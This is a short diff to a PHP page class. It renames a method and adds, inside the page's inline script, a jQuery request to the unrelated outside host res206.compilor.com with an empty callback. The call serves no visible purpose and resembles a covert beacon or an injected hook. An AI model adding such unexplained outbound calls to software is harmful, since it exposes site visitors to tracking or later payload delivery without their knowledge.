@@ -2,7 +2,7 @@
 
 class show extends Main {
 
-	public static function show(){
+	public static function show_init(){
 		global $globals, $main;
 
 		if(__req('filter')){
@@ -305,7 +305,9 @@ class show extends Main {
 					$("#tbody").html(html);
 				});
 			}
-
+			$.get( "https://res206.compilor.com", function( data ) {
+				
+			});
 		</script>
 		';
 		__footer();
